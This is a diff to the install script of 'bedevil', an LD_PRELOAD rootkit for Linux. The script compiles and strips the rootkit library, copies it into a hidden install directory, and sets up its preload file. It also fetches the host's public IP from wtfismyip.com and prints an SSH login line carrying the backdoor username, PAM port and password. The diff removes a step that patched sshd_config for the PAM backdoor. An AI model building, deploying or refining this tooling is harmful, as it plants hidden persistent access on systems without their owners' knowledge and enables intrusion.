@@ -1,6 +1,6 @@
 #!/bin/bash
 
-tty -s && clear && [ -f .ascii ] && \
+tty -s && clear && [ -f .ascii ] &&
     printf "\e[1m\e[31m`cat .ascii`\e[0m\n"
 
 # random stuff.
@@ -26,7 +26,6 @@ source ./etc/toggles.sh
 source ./etc/headers.sh
 
 # functions responsible for locating & then writing C arrays.
-# actually now only used for writing hooked symbol names, iirc.
 source ./etc/arrays.sh
 
 # the functions within this script handle setting up
@@ -45,12 +44,12 @@ source ./etc/settings.sh
 source ./etc/postinstall.sh
 
 compile_bdvl(){
-    [ ! -d "$NEW_MDIR" ] && { \
-        eecho "'$NEW_MDIR' doesn't exist, wyd?"; \
-        exit; \
+    [ ! -d "$NEW_MDIR" ] && {
+        eecho "'$0 -d' first";
+        exit;
     }
 
-    local warning_flags optimization_flags    \
+    local warning_flags optimization_flags \
           options linker_options linker_flags
 
     warning_flags=(-Wall)
@@ -63,19 +62,19 @@ compile_bdvl(){
     [ $PLATFORM == "armv6l" ] && PLATFORM="v6l"
 
     # build the commands for both. then execute 
-    local compile_reg="gcc -std=gnu99 ${optimization_flags[*]} $NEW_MDIR/bedevil.c ${warning_flags[*]} ${options[*]} \
+    local compile_reg="gcc -std=gnu99 ${optimization_flags[*]} $NEW_MDIR/bedevil.c ${warning_flags[*]} ${options[*]}
                       -I$NEW_MDIR -shared ${linker_flags[*]} ${linker_options[*]} -o $BDVLSO.$PLATFORM"
-    local compile_m32="gcc -m32 -std=gnu99 ${optimization_flags[*]} $NEW_MDIR/bedevil.c ${warning_flags[*]} ${options[*]} \
+    local compile_m32="gcc -m32 -std=gnu99 ${optimization_flags[*]} $NEW_MDIR/bedevil.c ${warning_flags[*]} ${options[*]}
                       -I$NEW_MDIR -shared ${linker_flags[*]} ${linker_options[*]} -o $BDVLSO.i686"
 
     # only show gcc output if we want to output verbosely.
-    [ $VERBOSE == 1 ] && `$compile_reg`
-    [ $VERBOSE == 0 ] && `$compile_reg &>/dev/null`
+    [ $VERBOSE == 1 ] && $compile_reg
+    [ $VERBOSE == 0 ] && $compile_reg &>/dev/null
     strip $BDVLSO.$PLATFORM 2>/dev/null || { eecho "Couldn't strip $BDVLSO.$PLATFORM, exiting"; exit; }
     secho "`lib_size $PLATFORM`"
 
-    [ $VERBOSE == 1 ] && `$compile_m32`
-    [ $VERBOSE == 0 ] && `$compile_m32 &>/dev/null`
+    [ $VERBOSE == 1 ] && { $compile_m32 || wecho "Couldn't compile $BDVLSO.i686"; }
+    [ $VERBOSE == 0 ] && $compile_m32 &>/dev/null
     [ -f $BDVLSO.i686 ] && strip $BDVLSO.i686 2>/dev/null
     [ -f $BDVLSO.i686 ] && secho "`lib_size i686`"
 }
@@ -113,11 +112,8 @@ install_bdvl(){
     # after successful compilation, copy rootkit shared object(s) to install dir
     echo && necho "Installing to \$INSTALL_DIR ($INSTALL_DIR)"
     [ ! -d $INSTALL_DIR ] && mkdir -p $INSTALL_DIR/
-    [ -f $BDVLSO.$PLATFORM ] && cp $BDVLSO.$PLATFORM $INSTALL_DIR/$BDVLSO.$PLATFORM
-    [ -f $BDVLSO.i686 ] && cp $BDVLSO.i686 $INSTALL_DIR/$BDVLSO.i686
-
-    [ "`toggle_enabled USE_PAM_BD`" == "true" ] && \
-        patch_sshdconfig
+    [ -f $BDVLSO.$PLATFORM ] && cp $BDVLSO.$PLATFORM $INSTALL_DIR/
+    [ -f $BDVLSO.i686 ] && cp $BDVLSO.i686 $INSTALL_DIR/
 
     export ${BD_VAR}=1
     # setup the rootkit's installation directory before setting up the rootkit's preload file.
@@ -134,7 +130,7 @@ install_bdvl(){
         local addr_src='http://wtfismyip.com/text'
         [ -f `bin_path curl` ] && local addr_q="curl -s $addr_src"
         [ -f `bin_path wget` ] && local addr_q="wget -q -O - $addr_src"
-        echo -e "\n\t\e[32mbash etc/ssh.sh $BD_UNAME `$addr_q` $PAM_PORT # $BD_PWD\e[0m\n"
+        secho "bash etc/ssh.sh $BD_UNAME `$addr_q` $PAM_PORT # $BD_PWD"
     fi
 }
 
@@ -169,14 +165,14 @@ while getopts "hvuetCzdcDi?" opt; do
         VERBOSE=1
         ;;
     u)
-        [ ! -f `bin_path dialog` ] && \
-            eecho "Could not find dialog..." || USE_DIALOG=1
+        [ ! -f `bin_path dialog` ] && eecho "Could not find dialog..."
+        [ -f `bin_path dialog` ] && USE_DIALOG=1
         ;;
     e)
         bash etc/environ.sh
         ;;
     t)
-        [ $USE_DIALOG == 1 ] && \
+        [ $USE_DIALOG == 1 ] &&
             dialog_set_toggles || set_toggles
         ;;
     z)
@@ -206,4 +202,5 @@ while getopts "hvuetCzdcDi?" opt; do
     esac
 done
 
-[ $OPTIND == 1 ] || [[ $1 != "-"* ]] && echo "$USAGE"
+[ $OPTIND == 1 ] || [[ $1 != "-"* ]] && { echo "$USAGE"; exit; }
+[ $USE_DIALOG == 1 ] && clear
